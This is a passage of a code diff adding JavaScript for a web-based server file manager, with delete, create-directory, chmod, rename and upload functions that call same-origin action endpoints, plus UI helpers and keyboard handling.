+        showToast('✅ 保存成功', 'success');
+        fmEditorClose();
+        fmRefresh();
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('保存失败: ' + err.message, 'error');
+    }
+}
+
+// ---------- 删除 ----------
+async function fmDelete(path, isDir) {
+    if (!confirm((isDir ? '删除目录及其所有内容？\n' : '删除文件？\n') + path)) return;
+    showLoading('删除中...', path);
+    try {
+        const res = await fetch('?action=fm_delete&path=' + encodeURIComponent(path), { credentials: 'same-origin', signal: _loadingAbort.signal });
+        const data = await res.json();
+        hideLoading();
+        if (!data.ok) { showToast(data.error || '删除失败', 'error'); return; }
+        showToast('✅ 已删除', 'success');
+        fmRefresh();
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('删除失败: ' + err.message, 'error');
+    }
+}
+
+// ---------- 新建目录 ----------
+function fmMkdirPrompt() {
+    const name = prompt('输入新目录名（支持嵌套如 test/sub）：');
+    if (!name) return;
+    fmMkdir(name);
+}
+async function fmMkdir(name) {
+    const path = (fmCurrentPath ? fmCurrentPath + '/' : '') + name;
+    showLoading('创建目录...', path);
+    try {
+        const res = await fetch('?action=fm_mkdir&path=' + encodeURIComponent(path), { credentials: 'same-origin', signal: _loadingAbort.signal });
+        const data = await res.json();
+        hideLoading();
+        if (!data.ok) { showToast(data.error || '创建失败', 'error'); return; }
+        showToast('✅ 创建成功', 'success');
+        fmRefresh();
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('创建失败: ' + err.message, 'error');
+    }
+}
+
+// ---------- 改权限 ----------
+function fmChmodPrompt(path, currentPerm) {
+    const mode = prompt('输入新权限（如 755、644、600）：', currentPerm);
+    if (!mode) return;
+    fmChmod(path, mode);
+}
+async function fmChmod(path, mode) {
+    showLoading('修改权限...', path + ' → ' + mode);
+    try {
+        const res = await fetch('?action=fm_chmod&path=' + encodeURIComponent(path) + '&mode=' + encodeURIComponent(mode), { credentials: 'same-origin', signal: _loadingAbort.signal });
+        const data = await res.json();
+        hideLoading();
+        if (!data.ok) { showToast(data.error || '修改失败', 'error'); return; }
+        showToast('✅ 权限已改为 ' + mode, 'success');
+        fmRefresh();
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('修改失败: ' + err.message, 'error');
+    }
+}
+
+// ---------- 重命名 ----------
+function fmRenamePrompt(path, currentName) {
+    const newName = prompt('输入新名称：', currentName);
+    if (!newName || newName === currentName) return;
+    fmRename(path, newName);
+}
+async function fmRename(path, newName) {
+    showLoading('重命名...', path + ' → ' + newName);
+    try {
+        const res = await fetch('?action=fm_rename&old=' + encodeURIComponent(path) + '&new=' + encodeURIComponent(newName), { credentials: 'same-origin', signal: _loadingAbort.signal });
+        const data = await res.json();
+        hideLoading();
+        if (!data.ok) { showToast(data.error || '重命名失败', 'error'); return; }
+        showToast('✅ 重命名成功', 'success');
+        fmRefresh();
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('重命名失败: ' + err.message, 'error');
+    }
+}
+
+// ---------- 上传 ----------
+function fmUploadClick() {
+    document.getElementById('uploadTarget').textContent = fmCurrentPath || '(根目录)';
+    document.getElementById('uploadFiles').value = '';
+    document.getElementById('uploadModal').style.display = 'flex';
+}
+function fmUploadClose() {
+    document.getElementById('uploadModal').style.display = 'none';
+}
+async function fmUploadSubmit() {
+    const input = document.getElementById('uploadFiles');
+    if (!input.files || input.files.length === 0) {
+        showToast('请选择文件', 'warning');
+        return;
+    }
+    const fd = new FormData();
+    for (let i = 0; i < input.files.length; i++) {
+        fd.append('files[]', input.files[i]);
+    }
+    showLoading('上传中...', '共 ' + input.files.length + ' 个文件，目标: ' + (fmCurrentPath || '(根目录)'));
+    try {
+        const res = await fetch('?action=fm_upload&path=' + encodeURIComponent(fmCurrentPath), {
+            method: 'POST', body: fd, credentials: 'same-origin', signal: _loadingAbort.signal
+        });
+        const data = await res.json();
+        hideLoading();
+        if (data.ok) {
+            showToast('✅ 上传 ' + (data.uploaded || []).length + ' 个文件' + ((data.errors||[]).length ? '，' + data.errors.length + ' 个失败' : ''), 'success');
+        } else {
+            showToast('上传失败: ' + (data.error || '未知错误'), 'error');
+        }
+        fmUploadClose();
+        fmRefresh();
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('上传失败: ' + err.message, 'error');
+    }
+}
+
+// ---------- 工具 ----------
+function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function escapeAttr(s) {
+    return String(s).replace(/['"\\]/g, c => '\\' + c);
+}
+
+// 文件管理按钮绑定
+document.getElementById('btn-filemgr').addEventListener('click', fmOpen);
+
+// 键盘快捷键：ESC 关闭文件管理器/模态框
+document.addEventListener('keydown', e => {
+    if (e.key !== 'Escape') return;
+    if (document.getElementById('editorModal').style.display !== 'none') { fmEditorClose(); return; }
+    if (document.getElementById('uploadModal').style.display !== 'none') { fmUploadClose(); return; }
+    if (document.getElementById('fmOverlay').classList.contains('open')) { fmClose(); return; }
+});
+
+// 阻止文件管理器内的链接默认跳转（防止误点 .htaccess 中的 deny 规则导致 403）
+document.getElementById('fmOverlay').addEventListener('click', e => {
+    if (e.target.tagName === 'A') e.preventDefault();
+});
+</script>
+</body></html>
